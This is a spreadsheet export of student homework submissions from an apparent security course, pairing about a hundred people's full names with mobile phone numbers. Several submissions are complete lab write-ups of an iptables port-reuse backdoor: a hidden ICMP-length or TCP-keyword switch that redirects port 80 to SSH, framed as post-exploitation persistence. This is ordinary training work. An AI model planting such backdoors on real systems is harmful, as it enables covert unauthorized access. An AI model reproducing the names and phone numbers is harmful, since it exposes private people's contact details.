序号,用户ID,学员昵称,备注,姓名,手机号码,最近采集号码,提交状态,提交时间,提交文字内容,提交图片内容,提交语音内容,批改老师,点评时间,点评文字内容,点评图片内容,点评语音内容
1,u_6223739256603_kLhKa9Mt2X,夏盈盈,,夏盈盈,"19191056997	","19191056997	",已提交,"2023-02-11 21:52:43	","我用#CSDN#这个app发现了有技术含量的博客，小伙伴们求同去《远程遥控iptables实现端口复用》, 一起来围观吧 https://blog.csdn.net/weixin_66218784/article/details/128928059?utm_source=app&app_version=5.1.1",,,,,,,
2,u_62206301424ce_VHeWIkVpUm,曹延超,,曹延超,"17832673580	","17832673580	",已提交,"2023-02-08 13:28:14	",http://t.csdn.cn/Jh0iy,,,,,,,
3,u_613f15f61b96c_RAsEnNc0Ob,种腾飞,,种腾飞,"18191829790	","18191829790	",已提交,"2023-02-07 16:04:04	",http://t.csdn.cn/Ab6Tk,,,,,,,
4,u_6162d81b35cfb_P9xj2hWQPS,李凯,,李凯,"17530107283	","+86-17530107283	",已提交,"2023-02-06 22:23:45	",https://blog.csdn.net/middlecorn/article/details/128909228?spm=1001.2014.3001.5502,,,,,,,
5,u_60a8a9583cef3_bwCFvgZnFF,李子恒,,李子恒,"13892404373	","13892404373	",已提交,"2023-02-06 17:18:58	",http://t.csdn.cn/Wn2as,,,,,,,
6,u_5fb5389e7e910_CItVq85A6U,王康利,,王康利,"15121945099	","15121945099	",已提交,"2023-02-06 14:38:08	",https://editor.csdn.net/md/?articleId=128901340,,,,,,,
7,u_6130448122589_3J2ha7YNQ6,翟佳明,,翟佳明,"13623798717	","+86-13623798717	",已提交,"2023-02-06 13:17:41	","?iptable端口复用
? ?
一，什么是端口复用

? ? ? ?端口复用是不同的应用程序使用相同的端口进行通讯，在内网渗透中，服务器仅允许指定的端口开放，利用端口复用可以把例如3389端口转发到80端口上进行外部连接。

二，iptable端口复用步骤

1.创建端口复用链

iptables -t nat -N LETMEIN

2、添加端口复用规则到内部，将流量转发到22端口

iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22

3、创建开启开关，如果接收到长1139的ICMP包，则将来源ip添加到letmein的列表中

iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1139 -m recent --set --name letmein --rsource -j ACCEPT

4、创建关闭开关，如果接收到一个长为 1140 的 ICMP 包，则将来源 IP 从 letmein 列表中去掉

iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1140 -m recent --name letmein --remove -j ACCEPT

5、如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒

iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN


6、测试

&1（开启复用）：向目标发送一个长为1111的ICMP包，实际长度为1139

ping -c 1 -s 1111 192.168.20.129

&2（关闭复用）：向目标发送一个长度为1112的ICMP数据包，实际长度为1140

ping -c 1 -s 1112 192.168.20.129

?


?",,,,,,,
8,u_5f61a9f537bd2_YdrrkQpd2R,马瑞,,马瑞,"18161684336	","+86-18161684336	",已提交,"2023-02-05 22:12:30	",https://blog.csdn.net/RuiIDS/article/details/128894303?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22128894303%22%2C%22source%22%3A%22RuiIDS%22%7D,,,,,,,
9,u_614420dd4f326_e64g45W9xR,刘正宇,,刘正宇,"17382111061	","+86-17382111061	",已提交,"2023-02-05 21:20:46	","【腾讯文档】iptables端口复用后门+SSLH
https://docs.qq.com/doc/DREJjQXJGWWtDUUJi",,,,,,,
10,u_607ed7fe1feee_Qt02SJpF4l,颜嘉豪,,颜嘉豪,"15353972098	","15353972098	",已提交,"2023-02-05 20:25:03	",https://blog.csdn.net/weixin_57385269/article/details/128892966,,,,,,,
11,u_6057ffce246cb_49f5V3ZIiw,胥佳平,,胥佳平,"15353635767	","15353635767	",已提交,"2023-02-05 18:42:22	",[图片][图片],"http://wechatappdev-10011692.file.myqcloud.com/appISt9v7wb6304/common_h5_1675593740_32178.png | http://wechatappdev-10011692.file.myqcloud.com/appISt9v7wb6304/common_h5_1675593740_15095.png",,,,,,
12,u_62276e3c5cde4_78HIRxujQL,孙俊鹏,,孙俊鹏,"18309170528	","18301970528	",已提交,"2023-02-05 17:28:12	",http://t.csdn.cn/LFo9S,,,,,,,
13,u_5fb92e4809f82_wxwXXHp8dU,天上人间,,陈嘉阳,"17366023282	","17366023282	",已提交,"2023-02-05 15:02:31	",https://jiayangchen.cn/?p=385,,,,,,,
14,u_61506380ac283_Lp1HaZKfek,黄杰,,黄杰,"17609185472	","17609185472	",已提交,"2023-02-05 14:30:29	",http://t.csdn.cn/HOU7v,,,,,,,
15,u_60cee7752d407_iqIRXQpaJD,田煜超,,田煜超,"13474131518	","+86-13474131518	",已提交,"2023-02-04 23:25:05	",【腾讯文档】https://docs.qq.com/doc/DSUtZS3d6Q1NkUERJ,,,,,,,
16,u_6232d16439291_yvj5ImgWUj,李焕宇,,李焕宇,"13272708414	","13272708414	",已提交,"2023-02-03 23:27:01	",http://t.csdn.cn/NRE0c,,,,,,,
17,u_60d911a612c4a_UUo43VoXqz,肖宇轩,,肖宇轩,"17302971032	","+86-17302971032	",已提交,"2023-02-03 09:53:25	",https://blog.csdn.net/XZZXFC/article/details/128860538,,,,,,,
18,u_60bf4b3767481_EaXv9waFNe,刘晨_石油,,刘晨晨,"18220401600	","+86-18220401600	",已提交,"2023-02-03 09:31:17	","https://www.mylovekiki.top/?p=805     
https://www.mylovekiki.top/?p=822",,,,,,,
19,u_618e55e87e92f_oDQ9NOJ3MN,杨勇,,杨勇,"17868781026	","17868781026	",已提交,"2023-02-03 09:09:08	","iptables：https://blog.csdn.net/weixin_64311421/article/details/128848193?spm=1001.2014.3001.5501

awk：
https://blog.csdn.net/weixin_64311421/article/details/128837338?spm=1001.2014.3001.5501",,,,,,,
20,u_61a86dcac702a_wZV5gAM8Ew,王礼,,王礼,"13684444377	","13684444377	",已提交,"2023-02-03 08:34:13	",http://t.csdn.cn/a04Se,,,,,,,
21,u_60c4dd273db83_vU6C1YfFnX,向庆秋,,向庆秋,"17685270169	","+86-17685270169	",已提交,"2023-02-03 08:27:08	",http://t.csdn.cn/A7CNz,,,,,,,
22,u_5f5d9bf8341c2_u28KWAXDwU,叶茂坤,,叶茂坤,"18123534545	","18123534545	",已提交,"2023-02-03 04:23:07	",https://blog.csdn.net/m0_56501091/article/details/128860099,,,,,,,
23,u_6270f6478555c_2OFbMHYjkR,田志明,,田志明,"18034631056	","18034631056	",已提交,"2023-02-03 03:41:44	","https://blog.csdn.net/qtttgeq/article/details/128860041?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167536686916782429773052%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=167536686916782429773052&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-128860041-null-null.142^v72^insert_down2,201^v4^add_ask&utm_term=iptables%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E5%90%8E%E9%97%A8%E4%B8%A4%E7%A7%8D%E5%8A%9E%E6%B3%95&spm=1018.2226.3001.4187",,,,,,,
24,u_6167fb8b386b2_qR1HkcyKn0,李子豪,,李子豪,"17782950368	","17782950398	",已提交,"2023-02-03 02:41:11	",http://t.csdn.cn/hhqX7,,,,,,,
25,u_6176b8c776c46_5WTyEbVV5S,刘万阔,,ikun,"16696130918	","+86-16696130918	",已提交,"2023-02-03 02:01:16	","权限维持
https://blog.csdn.net/HH_beibei/article/details/128859768 -- iptables端口复用
https://blog.csdn.net/HH_beibei/article/details/128859986 -- sslh隐藏端口
http://t.csdn.cn/qIOJ7 -- 反弹shell
",,,,,,,
26,u_6231ca7a63a23_S1mHSMb8lR,白松博,,白松博,"15319272911	","15319272911	",已提交,"2023-02-03 01:50:17	",http://t.csdn.cn/VNGFT,,,,,,,
27,u_5fb5e1f8c4087_i4oCMepz8E,李劲锋,,李劲锋,"18195153648	","18195153648	",已提交,"2023-02-03 01:23:19	",http://t.csdn.cn/jARqp,,,,,,,
28,u_6173e0e189fa2_zlokrZNMep,李龙,,李龙,"18683886491	","18683886491	",已提交,"2023-02-03 01:19:33	",http://t.csdn.cn/WAEXk,,,,,,,
29,u_5fb53641ce6c1_XSSaeBRJHr,.,,黄致远,"18609541128	","15595444584	",已提交,"2023-02-03 01:08:49	","## 环境：

攻击主机：Kali -- 192.168.218.135

目标主机：RHEL8 --  192.168.218.129

## 什么是端口复用

端口复用是指不同的应用程序使用相同端口使用相同端口进行通讯。

## 场景

目标主机是Linux系统，目标主机防火墙有严格的限制，只允许80端口的流量进入。我们拿到了目标主机的Webshell并且拿到了SSH的账号密码。但是我们不能通过22端口远程连接，必须得利用80端口做端口复用连接。

现在我们的思路就是利用Linux的iptables防火墙的nat表的PREROUTING 链做端口复用，因为nat 表的 PREROUTING 链会在路由决策之前被处理。

## 方法一：根据源地址做端口复用

将来自192.168.218.135的访问80端口的流量都重定向到22端口

```shell
[root@localhost ~]# iptables -t nat -A PREROUTING -p tcp -s 192.168.218.135 --dport 80 -j REDIRECT --to-port 22
```

![image-20230202222847750](C:\Users\30952\AppData\Roaming\Typora\typora-user-images\image-20230202222847750.png)

连接目标主机的80端口将会被重定向到22端口

```shell
┌──(root?kali)-[~]
└─# ssh root@192.168.218.129 -p 80
The authenticity of host '[192.168.218.129]:80 ([192.168.218.129]:80)' can't be established.
ED25519 key fingerprint is SHA256:Xyl+VWFSAPsWpBdCAW3pJSxbbajvRsoVvfqXavSa6fA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.218.129]:80' (ED25519) to the list of known hosts.
root@192.168.218.129's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Register this system with Red Hat Insights: insights-client --register
Create an account or view all your systems at https://red.ht/insights-dashboard
Last login: Thu Feb  2 09:10:41 2023 from 192.168.218.1
[root@localhost ~]# 
```

这样搞当我们访问目标主机80端口时候的所有的流量都会被转发给22端口，网页可能就打不开了哈哈。如果我们不用访问该HTTP服务的话，还行。适用于VPS连接。

## 方法二：利用ICMP协议做遥控开关

1. 创建端口复用链

   ```shell
   [root@localhost ~]# iptables -t nat -N LETMEIN
   ```

2. 创建端口复用规则，将流量转发给22端口

   ```shell
   [root@localhost ~]# iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
   ```

3. 开启开关，如果接受到一个长为1139的ICMP包，则将源IP添加到letmein中

   ```shell
   [root@localhost ~]# iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1139 -m recent --set --name letmein --rsource -j ACCEPT
   ```

4. 关闭开关，如果接收到一个长为 1140 的 ICMP 包，则将源 IP 从 letmein 中去掉

   ```shell
   [root@localhost ~]# iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1140 -m recent --name letmein --remove -j ACCEPT
   ```

5. 如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒

   ```shell
   [root@localhost ~]# iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
   ```

   **开启复用，向目标发送一个长度为1111的ICMP数据包（加上IP的包头20位和ICMP包头的8位实际位数位1139）**

   ```shell
   ┌──(root?kali)-[~]
   └─# ssh root@192.168.218.129
   ssh: connect to host 192.168.218.129 port 22: Connection timed out
   
   ┌──(root?kali)-[~]
   └─# ping -c 1 -s 1111 192.168.218.129
   PING 192.168.218.129 (192.168.218.129) 1111(1139) bytes of data.
   1119 bytes from 192.168.218.129: icmp_seq=1 ttl=64 time=0.826 ms
   
   --- 192.168.218.129 ping statistics ---
   1 packets transmitted, 1 received, 0% packet loss, time 0ms
   rtt min/avg/max/mdev = 0.826/0.826/0.826/0.000 ms
   
   ┌──(root?kali)-[~]
   └─# ssh root@192.168.218.129 -p 80
   The authenticity of host '[192.168.218.129]:80 ([192.168.218.129]:80)' can't be established.
   ED25519 key fingerprint is SHA256:Xyl+VWFSAPsWpBdCAW3pJSxbbajvRsoVvfqXavSa6fA.
   This key is not known by any other names
   Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
   Warning: Permanently added '[192.168.218.129]:80' (ED25519) to the list of known hosts.
   root@192.168.218.129's password: 
   Activate the web console with: systemctl enable --now cockpit.socket
   
   Register this system with Red Hat Insights: insights-client --register
   Create an account or view all your systems at https://red.ht/insights-dashboard
   Last login: Thu Feb  2 09:10:41 2023 from 192.168.218.1
   [root@localhost ~]# 
   ```

   

   **关闭复用向目标发送一个长度为1112的ICMP数据包**

   ```shell
   ┌──(root?kali)-[~]
   └─# ping -c 1 -s 1112 192.168.218.129
   PING 192.168.218.129 (192.168.218.129) 1112(1140) bytes of data.
   1120 bytes from 192.168.218.129: icmp_seq=1 ttl=64 time=0.377 ms
   
   --- 192.168.218.129 ping statistics ---
   1 packets transmitted, 1 received, 0% packet loss, time 0ms
   rtt min/avg/max/mdev = 0.377/0.377/0.377/0.000 ms
   ```

   **该方法的缺点是，如果目标在内网，我们无法直接ping**

## 方法三：利用TCP协议做遥控开关

利用 tcp 数据包中的关键字做遥控开关，不怕目标在内网。

1. 创建端口复用链

   ```shell
   [root@localhost ~]# iptables -t nat -N LETMEIN
   ```

2. 创建端口复用规则，将流量转发给22端口

   ```shell
   [root@localhost ~]# iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
   ```

3. 开启开关如果接收到一个含有threathuntercoming的TCP包，则将来源 IP 添加到加为letmein的列表中

   ```shell
   [root@localhost ~]# iptables -A INPUT -p tcp -m string --string 'zhimakaimen' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
   ```

4. 关闭开关，如果接收到一个含有threathunterleaving的TCP包，则将来源 IP 从letmein的列表中移除

   ```shell
   [root@localhost ~]# iptables -A INPUT -p tcp -m string --string ‘threathunterleaving’ --algo bm -m recent --name letmein --remove -j ACCEPT
   ```

5. 如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒

   ```shell
   [root@localhost ~]# iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
   ```

**开启复用，开启后本机到目标80端口的流量将转发至目标的SSH**

```shell
┌──(root?kali)-[~]
└─# echo zhimakaimen | socat - tcp:192.168.218.129:80
```

**关闭复用，80端口恢复正常**

```shell
──(root?kali)-[~]
└─# echo bagalalu | socat - tcp:192.168.218.129:80
```
",,,,,,,
30,u_607abfc5789ff_JyIRVgP4dm,李云锋,,李云锋,"15823620432	","15823620432	",已提交,"2023-02-03 00:56:23	",http://t.csdn.cn/5q6w5,,,,,,,
31,u_6262a00127bff_KezbT4F47W,徐坤,,徐坤,"13540369880	","13540369880	",已提交,"2023-02-03 00:00:20	",https://blog.csdn.net/xk2844600795/article/details/128856058?spm=1001.2014.3001.5501,,,,,,,
32,u_61cadfa72dbca_Vlha6Ag0AE,毛璇,,毛璇,"13186259133	","13186259133	",已提交,"2023-02-02 23:58:55	",http://t.csdn.cn/CY03F,,,,,,,
33,u_5f84329aeb0ee_HBs8g8tJTf,梁博涛,,梁博涛,"18583206190	","18583206190	",已提交,"2023-02-02 23:58:38	",http://t.csdn.cn/T65Z3,,,,,,,
34,u_5fb53eb0e7bfb_79PQFIpoMB,银科-唐彰阳,,唐彰阳,"15591037905	","12345678911	",已提交,"2023-02-02 23:41:13	",http://t.csdn.cn/CXr5r,,,,,,,
35,u_6171157271322_ygybqutd5Z,李强,,李强,"18909165614	","18909165614	",已提交,"2023-02-02 22:56:42	","防火墙基础整理： http://t.csdn.cn/OQndw 

iptables端口复用： http://t.csdn.cn/QxlNF 

awk整理ing...",,,,,,,
36,u_5fb530dd1b01b_PbqpFrQAOg,马丽华,,马丽华,"13209544842	","13209544842	",已提交,"2023-02-02 22:52:56	",https://blog.csdn.net/weixin_52714299/article/details/128849949,,,,,,,
37,u_qq_5fb641d9befb5_OHB0npNVHZX,张梓豪,,张梓豪,"13315114756	","13315114756	",已提交,"2023-02-02 22:41:30	",https://blog.csdn.net/zzh164672917/article/details/128858578?spm=1001.2014.3001.5502,,,,,,,
38,u_60f5485862d2e_MuQ4tXqHsN,sxxy,,宋晓英,"18992002636	","18992002636	",已提交,"2023-02-02 21:45:33	","链接：https://pan.baidu.com/s/1uFVbEjQKvkhQSp6AuXPLmA 
提取码：r83w",,,,,,,
39,u_5fb5381eef8e3_M69vs6ebN6,唐明磊,,唐明磊,"15319835085	","15319835085	",已提交,"2023-02-02 21:34:15	",http://t.csdn.cn/Ge5pg,,,,,,,
40,u_5fc10049b6ff2_Tpaw4CNSLo,肖仕明,,肖仕明,"13550806785	","13550806785	",已提交,"2023-02-02 21:02:34	",http://t.csdn.cn/Nulf5,,,,,,,
41,u_5fb54063cd2bb_uK16iEC8ed,王一u,,王一u,"13299501195	","+86-13299501195	",已提交,"2023-02-02 20:59:19	",http://t.csdn.cn/ddwxS,,,,,,,
42,u_613b17882b733_p1TWNteVmp,曹博,,曹博,"17868760880	","+86-17868760880	",已提交,"2023-02-02 20:29:02	",https://mp.csdn.net/mp_blog/creation/editor/128854804,,,,,,,
43,u_5fb929d55c919_MzcJo7fiWb,刘阳,,刘阳,"15365126803	","13327795951	",已提交,"2023-02-02 20:13:35	",https://blog.csdn.net/m0_52333150/article/details/128854231?spm=1001.2014.3001.5501,,,,,,,
44,u_6151c425e3dc0_bxNfd4s4mp,徐佳龙,,徐佳龙,"15319911932	","+86-15319911932	",已提交,"2023-02-02 20:02:19	","iptables端口复现：
https://blog.csdn.net/m0_63069714/article/details/128846636?spm=1001.2014.3001.5502
SSLH：
https://blog.csdn.net/m0_63069714/article/details/128856151?spm=1001.2014.3001.5502",,,,,,,
45,u_5fc10e2dca5c5_jeYbvbfhlG,周鑫宇,,周鑫宇,"15608084631	","15608084631	",已提交,"2023-02-02 19:38:21	",https://blog.csdn.net/a505964648/article/details/128842292?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22128842292%22%2C%22source%22%3A%22a505964648%22%7D,,,,,,,
46,u_5fb5380a4c6e6_s6PxhhLeLC,王烨岚,,王烨岚,"18103998978	","18103998978	",已提交,"2023-02-02 19:15:24	",http://t.csdn.cn/Lefmw,,,,,,,
47,u_qq_5fb5387f95111_J1ADBdPJtgU,马葆祺,,马葆祺,"17795062130	","17795062130	",已提交,"2023-02-02 18:00:42	",http://t.csdn.cn/x4bTp,,,,,,,
48,u_619b73b884dfa_hIGkHSR76r,岳遥,,岳遥,"18829026012	","18829026012	",已提交,"2023-02-02 13:31:37	","iptables端口复用后门
1、定义：端口复用是指不同的应用程序使用相同端口进行通讯。
2、场景：内网渗透中，搭建隧道时，服务器仅允许指定的端口对外开放。利用端口复用可以将3389或22等端口转发到如80端口上，以便外部连接。
3、功能：
端口复用可以更好地隐蔽攻击行为，提高生存几率。
端口复用有时也用作通道后门。
4、特点：端口复用在系统已开放的端口上进行通讯，只对输入的信息进行字符匹配，不对网络数据进行任何拦截、复制类操作，所以对网络数据的传输性能几乎没有影响。
一、Linux端口复用
1.概述
??使用iptables实现端口复用，使用socat进行连接。
??使用该方法开启的端口复用为有限的端口复用，复用后端口正常业务会受影响，仅用于后门留存，或者临时使用，不建议长期使用。

2.原理
(1) iptables
??iptables是linux下的防火墙管理工具。

真正实现防火墙功能的是netfilter，它是linux内核中实现包过滤的核心。
免费。
可实现封包过滤、封包重定向和网路地址转换（NAT）等功能。
(2) 链
??链是一些按顺序排列的规则的列表。

PREROUTING链――对数据包作路由选择前应用此链中的规则（所有的数据包进来的时侯都先由这个链处理）
INPUT链――进来的数据包应用此规则链中的策略
OUTPUT链――外出的数据包应用此规则链中的策略
FORWARD链――转发数据包时应用此规则链中的策略
POSTROUTING链――对数据包作路由选择后应用此链中的规则（所有的数据包出来的时侯都先由这个链处理）
(3) 表
??表由一组预先定义的链组成。

filter表――用于存放所有与防火墙相关操作的默认表。通常用于过滤数据包。
nat表――用于网络地址转换
mangle表――用于处理数据包
raw表――用于配置数据包，raw 中的数据包不会被系统跟踪。
(4) 链和表的关系及顺序
PREROUTING: raw -> mangle -> nat
INPUT: mangle -> filter
FORWARD: mangle -> filter
OUTPUT: raw -> mangle -> nat -> filter
POSTROUTING: mangle -> nat
(5) 表和链的关系
??实际使用中是从表作为操作入口：

raw 表：PREROUTING，OUTPUT
mangle表：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING
nat 表：PREROUTING，OUTPUT，POSTROUTING
filter 表：INPUT，FORWARD，OUTPUT
(7) 添加规则
iptables \t 表名 <\A/I/D/R> 规则链名 [规则号] <\i/o 网卡名> \p 协议名 <\s 源ip、源子网> \\sport 源端口 <\d 目标ip/目标子网> \\dport 目标端口 \j 动作

(8) socat
??Socat是linux下的一个多功能的网络工具，名字来由是socket cat。其功能与netcat类似，可以看做是netcat的加强版。

3.指令速查
(1) 配置端口复用及开关规则
目标主机上创建新转发链
设置复用规则（设置转发规则）
设置开关规则（接受约定字符后规则生效/失效）
约定字符尽量复杂
# 新建端口复用链
iptables -t nat -N LETMEIN
# 端口复用规则
iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
# 开启端口复用开关
iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
# 关闭端口复用开关
iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
# 开启端口复用
iptables -t nat -A PREROUTING -p tcp --dport 8000 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
(2) 使用socat连接
??使用socat发送约定口令至目标主机打开端口复用开关
echo threathuntercoming | socat \ tcp:192.168.245.135:8000

??使用完毕后，发送约定关闭口令至目标主机目标端口关闭端口复用
echo threathunterleaving | socat \ tcp:192.168.245.135:8000

4.实验
Target：Ubuntu 16.04 x64
IP：192.168.245.135
开启8000端口的web服务
开启22端口

??配置端口复用：


Attacker：Kali 2020 x64
IP：192.168.245.130
??使用socat连接：


??此时ssh可以通过8000访问，但是8000端口的正常web业务受到影响：


??使用socat断开连接，ssh无法再连接，但是8000端口回复正常：",,,,,,,
49,u_62c3ff5853411_vT88tfoZk2,畅希杰,,畅希杰,"15929471708	","15929471708	",已提交,"2023-02-02 10:19:52	",http://t.csdn.cn/lcjet,,,,,,,
50,u_60a89bce514ec_y1Jg5EdfoG,宋浪维,,宋浪维,"13054081860	","+86-13055081860	",已提交,"2023-02-01 23:20:24	",http://t.csdn.cn/YpdYw,,,,,,,
51,u_60669b0f43b12_JHSA1tuqCY,王凯,,王凯,"13007942470	","13007942470	",未提交,,,,,,,,,
52,u_6233f62b20972_YoHrmgSwe7,黄振国,,黄振国,"13014253262	","13014253262	",未提交,,,,,,,,,
53,u_5fb54da02a075_PTqktqIwlW,于佳佳,,于佳佳,"13014272619	","13014272619	",未提交,,,,,,,,,
54,u_qq_61641ac34170f_ObUnCzIUkyV,席崇文,,席崇文,"13079572109	","+86-13079572109	",未提交,,,,,,,,,
55,u_5fc23bc8533c9_aZmB9pq1J9,成都-杨,,杨,"13350437250	","13350437250	",未提交,,,,,,,,,
56,u_609615125693d_ooMGNUNU8l,鲍宇翔,,鲍宇翔,"13389128063	","+86-13389128063	",未提交,,,,,,,,,
57,u_6258e1e5533f8_RiljH4GTkh,郭庆,,郭庆,"13399181978	","13399181978	",未提交,,,,,,,,,
58,u_5fb537ccf015c_JCkQH1auW5,王杰银科,,王杰,"13519232105	","13519232105	",未提交,,,,,,,,,
59,u_622ab9773fafc_zTrtjRbgcb,吕晓亮,,吕晓亮,"13773429354	","13773429354	",未提交,,,,,,,,,
60,u_5fd581c2e6880_9fZIGo0S2J,周涛,,周涛,"13882900543	","13882900543	",未提交,,,,,,,,,
61,u_5ffebddb5e899_pIJYp48pzQ,杨鹏星,,杨鹏星,"13892376205	","+86-13892376205	",未提交,,,,,,,,,
62,u_qq_5fb536aea029b_29xfHsBqbRt,孙智瑞,,孙智瑞,"13895616437	","+86-15595041091	",未提交,,,,,,,,,
63,u_5ff301f64a183_rFXCtZFEp4,张凌霜,,张凌霜,"15020553853	","15020553583	",未提交,,,,,,,,,
64,u_605801335e299_afm56hZxzZ,刘威,,刘威,"15091113695	","15091113695	",未提交,,,,,,,,,
65,u_qq_5fc7b6eb4420a_VaaOPwFXmXq,冯嘉欣,,冯嘉欣,"15109627559	","15109627559	",未提交,,,,,,,,,
66,u_60f142e04c177_bg3doKKFQn,邓家乐,,邓家乐,"15289304112	","+86-15289304112	",未提交,,,,,,,,,
67,u_6176129a96ed6_scNpDGKUMW,一方通行,,张传斌,"15319030882	",,未提交,,,,,,,,,
68,u_6173dbf953c5d_QJRbSmpNJZ,杨国甜,,杨国甜,"15381484024	",,未提交,,,,,,,,,
69,u_626a34345fd12_3XO1PaQhq6,舒启超,,舒启超,"15691735950	","15691735950	",未提交,,,,,,,,,
70,u_604ca40a91ebb_HtqQ9OXH0d,魏麟懿,,魏麟懿,"15769143648	","15769143648	",未提交,,,,,,,,,
71,u_613b4d9b42c4c_4E0eda6rSy,木鱼花,,刘锦阳,"15891601589	",,未提交,,,,,,,,,
72,u_62cbf0c9563bb_ARhIFJtIyV,威,,田少威,"15902995764	","15902995764	",未提交,,,,,,,,,
73,u_5fb53990db680_vPdDKv7v2Y,陈梓祺,,陈梓祺,"15909663892	","15909663892	",未提交,,,,,,,,,
74,u_6059a64c2be1a_ZIMMPR5jXZ,赠山川为礼,,吕帅,"15929918582	","15929918582	",未提交,,,,,,,,,
75,u_637e1a1a326e9_4alEINb9Mv,田兴博,,田兴博,"15991160530	","15991160530	",未提交,,,,,,,,,
76,u_60f25c3261643_1FnIpiQMNL,魏博华,,魏博华,"17389182673	","+86-17389182673	",未提交,,,,,,,,,
77,u_619b73639806d_okwunmjc64,张轩豪.,,张轩豪,"17392208063	","17392208063	",未提交,,,,,,,,,
78,u_5fb620b80867a_lEVrVbJS0M,20级矿大李健华,,李健华,"17647034582	","17647034582	",未提交,,,,,,,,,
79,u_614ae799b2f5e_04YsCfiKWP,贺振锋,,贺振锋,"17691307138	","17691307138	",未提交,,,,,,,,,
80,u_5fb541fb30254_piEkowhPic,KaKaKaoo,,薛鼎瀚,"17709509016	","17709509016	",未提交,,,,,,,,,
81,u_60af2de63d32a_XKe7ATp7yH,无心,,王治杰,"17719649210	","17719649210	",未提交,,,,,,,,,
82,u_6171147457422_MLPvtytBkc,刘驰,,刘驰,"17742481798	","17742481798	",未提交,,,,,,,,,
83,u_617602ea6169b_UTnCW4IprK,王浩楠,,王浩楠,"17782516098	",,未提交,,,,,,,,,
84,u_5fb545d24fd99_ntBEAYurEO,王曦宇,,王曦宇,"17795122593	","15909512433	",未提交,,,,,,,,,
85,u_5f9c113e462ed_SijxQrJs1C,米昊阳,,米昊阳,"17795743668	","17795743668	",未提交,,,,,,,,,
86,u_5fb53ae941544_yA7OBIlhMT,李昂健,,李昂健,"17809580106	","17809580106	",未提交,,,,,,,,,
87,u_617606f485bcc_NjUMno66tO,随便,,朱慨杰,"18064315052	",,未提交,,,,,,,,,
88,u_5ffececd70724_C3dXnE7pqk,郝世康,,郝世康,"18091249800	","18091249800	",未提交,,,,,,,,,
89,u_5fb536b122c17_UJTmSne1GF,纳晓明,,纳晓明,"18109509798	","18109509798	",未提交,,,,,,,,,
90,u_60813cb183ff8_T7D5KDqfEU,Loong,,常鸿睿,"18129262304	","18129262304	",未提交,,,,,,,,,
91,u_5fb536cfd054f_5uYz1Tipdx,"银川  李伟龙",,李伟龙,"18209544208	","+86-18209544208	",未提交,,,,,,,,,
92,u_61471ee76a290_fXJXUGnH8M,pious,,白浩杰,"18220143963	","+86-18220143963	",未提交,,,,,,,,,
93,u_5fc0ed9f6d1e3_hpbqvYVok3,徐荣耀,,徐荣耀,"18282722751	","18282722751	",未提交,,,,,,,,,
94,u_60cd565629f66_PTfGrDcFD1,孙,,孙翌童,"18392784305	","18392784305	",未提交,,,,,,,,,
95,u_5f0199ad4813b_9koxQOvKNA,程晓鹏,,程晓鹏,"18616296068	","18616296068	",未提交,,,,,,,,,
96,u_62c971717f2eb_2vpq2PO2L8,凌烛问心,,刘博文,"18694418951	","18694418951	",未提交,,,,,,,,,
97,u_60b20d1645317_hwyQrHQXGl,潘佳乐,,潘佳乐,"18700181047	","+86-18700180147	",未提交,,,,,,,,,
98,u_5ffec3fb60f05_GFzZGIAXTW,春风不解意,,王力,"18706819064	","18706819064	",未提交,,,,,,,,,
99,u_615fe10a57213_WgG61fBrTF,王博,,王博,"18710674603	","18710674603	",未提交,,,,,,,,,
100,u_6053fdcb27386_S5Gm9veec6,你予我*,,范d鑫,"18729676921	","18729676921	",未提交,,,,,,,,,
101,u_6057fd6e56e72_d1TjVz5onM,王宇航,,王宇航,"18829581620	","18829581620	",未提交,,,,,,,,,
102,u_6073a8c064444_gPR6YppnvH,田震,,田震,"18991434602	","18991434602	",未提交,,,,,,,,,
103,u_6071d89e66a87_UPKOSQS127,董小建,,董小建,"19929596159	","+86-19929596159	",未提交,,,,,,,,,
